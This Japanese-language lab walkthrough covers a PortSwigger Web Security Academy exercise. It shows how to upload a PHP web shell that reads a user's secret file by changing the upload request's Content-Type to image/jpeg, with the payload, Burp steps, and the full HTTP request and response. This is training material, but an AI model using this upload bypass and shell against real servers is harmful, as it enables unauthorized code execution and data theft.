# Content-Type 制限バイパスによる Web シェルのアップロード

以下のハッキングラボは Content-Type により画像以外のファイルアップロードをガードしていますが、Content-Type は書き換え可能なので回避可能です。  
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

- 1. Burp Suite を起動して、Proxy タブからブラウザを起動
- 2. ブラウザからハッキングラボにアクセスします
- 3. 任意のユーザーでログインします
- 4. アバター画像アップロードが可能なので、任意の画像をアップロードします

- 5. 以下で php ファイルを作成し、アップロードします

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

アップロード時に Content-Type が違うと怒られて、アップロードは失敗します。

```
Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
```

- 6. 上記リクエスト POST /my-account/avatar を Send to Repeater します

- 7. リクエストの Content-Type を application/octet-stream から image/jpeg に書き換えて、リクエストを送信するとアップロードに成功します。

- 8. 手順 4 で送信した GET /files/avatars/<画像ファイル> HTTP/2 を Sent do repeater します

- 9. GET /files/avatars/<php ファイル>に置き換えてリクエストを送信すると、carlos の秘密情報が抜き取れます

■ リクエスト

```
GET /files/avatars/exploit.php HTTP/2
Host: 0a7d00ba03b9f88880b63a2b003600e1.web-security-academy.net
Cookie: session=ID7e307JuvNuOJgCCXJ6m3WFyerxaqE0
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a7d00ba03b9f88880b63a2b003600e1.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

■ レスポンス

```
HTTP/2 200 OK
Date: Sat, 05 Aug 2023 06:40:36 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

XDcY8naNIFaDlWN4vArFoMaOs2ZkgUFf
```
